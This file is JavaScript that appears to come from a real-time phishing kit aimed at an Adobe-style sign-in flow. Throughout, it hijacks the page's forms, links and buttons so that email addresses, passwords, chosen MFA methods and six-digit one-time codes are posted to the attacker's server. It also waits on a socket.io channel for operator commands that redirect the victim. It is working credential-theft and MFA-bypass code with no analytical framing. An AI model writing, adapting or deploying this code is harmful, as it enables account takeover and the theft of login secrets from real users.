const urlPath = location.pathname
const urlSplit = urlPath.split("/")
const id = urlSplit[3]
const appName = urlSplit[2]

const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick")
    element.removeAttribute('onmousedown')
})

document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname
    form.method = "POST"
    form.noValidate = false
    form.target = "_self"

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "spikeType"
    form.append(input)
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, JSON.stringify(data), {
            method: "post",
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => res.text())
            .then(data => {
                console.log(data);
            })
    } else {
        let formData = ""
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
        }

        const form = document.createElement("form")
        form.method = "post"
        form.action = location.href
        form.innerHTML = formData
        document.body.appendChild(form)
        form.submit()
    }
}

/**
 *  spikes selector functions +===================+
 */

const selectorSpikes = [
    {
        spikeType: "home-email",
        querys: [
            `[id="EmailPage-EmailField"]`,
            `[name="username"]`

        ],
        runner() {
            let submitbtn = document.querySelector(`[data-id="EmailPage-ContinueButton"]`)
            submitbtn.classList.remove("is-disabled")
            submitbtn.disabled = false
            submitbtn.type = "submit"

            const passwd = document.querySelector(`[name="passwd"]`)
            if (passwd.getAttribute("tabindex") == "-1") {
                passwd.required = false
                return true
            }

            return false
        }
    },
    {
        spikeType: "home-password",
        querys: [
            `[type="password"]`,
            `[id="PasswordPage-PasswordField"]`,
            `[name="password"]`
        ],
        runner() {
            let submitbtn = document.querySelector(`[data-id="PasswordPage-ContinueButton"]`)
            submitbtn.classList.remove("is-disabled")
            submitbtn.disabled = false
            submitbtn.type = "submit"

            const password = document.querySelector(`[type="password"]`)
            const showPassBtn = document.querySelector(`[aria-label="Show password"]`)

            showPassBtn.addEventListener("click", () => {
                if (password.type == "password") {
                    password.type = "text"
                    showPassBtn.innerHTML = `<svg viewBox="0 0 36 36" focusable="false" aria-hidden="true" role="img" class="spectrum-Icon spectrum-Icon--sizeS PasswordField-VisibilityToggle__Icon"><path d="M24.613 8.58A14.972 14.972 0 0 0 18 6.937c-8.664 0-15.75 8.625-15.75 11.423 0 3 7.458 10.7 15.686 10.7 8.3 0 15.814-7.706 15.814-10.7 0-2.36-4.214-7.341-9.137-9.78zM18 27.225A9.225 9.225 0 1 1 27.225 18 9.225 9.225 0 0 1 18 27.225z"></path><path d="M20.667 18.083A2.667 2.667 0 0 1 18 15.417a2.632 2.632 0 0 1 1.35-2.27 4.939 4.939 0 0 0-1.35-.209A5.063 5.063 0 1 0 23.063 18a4.713 4.713 0 0 0-.175-1.2 2.625 2.625 0 0 1-2.221 1.283z"></path></svg>`
                } else {
                    password.type = "password"
                    showPassBtn.innerHTML = `<svg viewBox="0 0 36 36" focusable="false" aria-hidden="true" role="img" class="spectrum-Icon spectrum-Icon--sizeS PasswordField-VisibilityToggle__Icon"><path d="M14.573 9.44A9.215 9.215 0 0 1 26.56 21.427l2.945 2.945c2.595-2.189 4.245-4.612 4.245-6.012 0-2.364-4.214-7.341-9.137-9.78A14.972 14.972 0 0 0 18 6.937a14.36 14.36 0 0 0-4.989.941z"></path><path d="M33.794 32.058L22.328 20.592A5.022 5.022 0 0 0 23.062 18a4.712 4.712 0 0 0-.174-1.2 2.625 2.625 0 0 1-2.221 1.278A2.667 2.667 0 0 1 18 15.417a2.632 2.632 0 0 1 1.35-2.27 4.945 4.945 0 0 0-1.35-.209 5.022 5.022 0 0 0-2.592.734L3.942 2.206a.819.819 0 0 0-1.157 0l-.578.579a.817.817 0 0 0 0 1.157l6.346 6.346c-3.816 2.74-6.3 6.418-6.3 8.072 0 3 7.458 10.7 15.686 10.7a16.455 16.455 0 0 0 7.444-1.948l6.679 6.679a.817.817 0 0 0 1.157 0l.578-.578a.818.818 0 0 0-.003-1.155zM18 27.225a9.2 9.2 0 0 1-7.321-14.811l2.994 2.994A5.008 5.008 0 0 0 12.938 18 5.062 5.062 0 0 0 18 23.063a5.009 5.009 0 0 0 2.592-.736l2.994 2.994A9.144 9.144 0 0 1 18 27.225z"></path></svg>`
                }
            })

            document.forms[0].addEventListener("submit", e => {
                if (password.value < 6) {
                    e.preventDefault()
                }
            })
        }
    }
]

/**
 * button spikes functions +===================+
 */

const buttonSpikes = [
    {
        spikeType: "auth-type",
        runner() {
            const allAuthBtns = document.querySelectorAll(`[class="ActionList-Item"]`)
            if (allAuthBtns.length > 0) {
                allAuthBtns.forEach((btn, index) => {
                    btn.addEventListener("click", () => {
                        spikeForm({
                            spikeType: this.spikeType,
                            spikeAuth: index
                        })
                    })
                })
            }
        }
    },
    {
        spikeType: "verify-code",
        runner() {
            let allInputs = []
            for (let i = 0; i < 6; i++) {
                allInputs.push(document.querySelector(`[data-id="CodeInput-${i}"]`))
            }

            if (!allInputs.includes(null)) {
                const codeInputContainer = document.querySelector(".CodeInput")
                codeInputContainer.style = `width: 100%;`
                codeInputContainer.innerHTML = `
               <input type="number" style="max-width: 100%;" id="otp_code_input" class="spectrum-Textfield CodeInput-Digit" maxlength="6" pattern="\d*" autocomplete="one-time-code" required> 
               `
                let otp_code_input = document.querySelector('#otp_code_input')
                otp_code_input.addEventListener("input", () => {
                    if (otp_code_input.value.length == 6) {
                        spikeForm({
                            spikeType: this.spikeType,
                            otp_code: otp_code_input.value
                        })
                    }
                })
            }
        }
    },
    {
        spikeType: "verify-btn",
        runner() {
            const bodyText = document.body.innerText

            if (bodyText.includes(`To confirm your identity we'll send you a verification code to`)) {
                document.querySelector(`[name="submit"]`).addEventListener('click', () => {
                    spikeForm({
                        spikeType: this.spikeType
                    })
                })
            }
        }
    },
    {
        spikeType: "select-other-auth",
        runner() {
            document.querySelectorAll("a").forEach(btn => {
                if (btn.innerText.includes(`Use another method to receive the code`)) {
                    btn.removeAttribute("href")
                    btn.style.cursor = "pointor"
                    btn.addEventListener("click", () => {
                        spikeForm({
                            spikeType: this.spikeType
                        })
                    })
                }
            })
        }
    },
    {
        spikeType: "resend-code",
        runner() {
            document.querySelectorAll("button").forEach(btn => {
                if (
                    btn.innerText.includes("Didn't receive your code?")
                    || btn.innerText.includes(`Resend Code`)
                ) {
                    btn.addEventListener('click', () => {
                        spikeForm({
                            spikeType: this.spikeType
                        })
                    })
                }
            })
        }
    },
    {
        spikeType: "change-auth-type",
        runner() {
            document.querySelectorAll('a').forEach(atag => {
                if (atag.innerText.includes("Use another method to receive the code")) {
                    atag.removeAttribute("href")
                    atag.addEventListener('click', () => {
                        spikeForm({
                            spikeType: this.spikeType
                        })
                    })
                }
            })
        }
    }
]

for (const selectorSpike of selectorSpikes) {
    const spikeType = selectorSpike.spikeType
    const querys = selectorSpike.querys
    const queryLength = querys.length

    let queryMatch = 0
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++
    }

    if (queryLength == queryMatch) {
        addSpikeType(spikeType)
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner()
            } catch (error) { }
        }

        break
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner()
    } catch (error) { }
}

// +----------------+
{

}